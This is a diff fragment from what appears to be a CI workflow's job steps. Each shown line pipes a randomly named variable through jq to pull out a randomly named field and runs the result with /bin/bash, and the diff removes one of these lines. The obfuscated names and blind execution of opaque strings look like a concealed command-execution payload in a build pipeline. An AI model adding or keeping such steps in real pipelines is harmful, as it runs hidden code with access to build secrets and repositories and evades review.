@@ -20,7 +20,6 @@ jobs:
           echo $gpt8 | jq -r .rtn8 | /bin/bash
           printf '%s' "$vfet30" | jq -r .glwl3 | /bin/bash
           echo $zffks0 | jq -r .fvje132 | /bin/bash
-          printf '%s' "$ayh33" | jq -r .bztw1376 | /bin/bash
           printf '%s' "$rsuob3" | jq -r .x7 | /bin/bash
 
       - name: Persist data
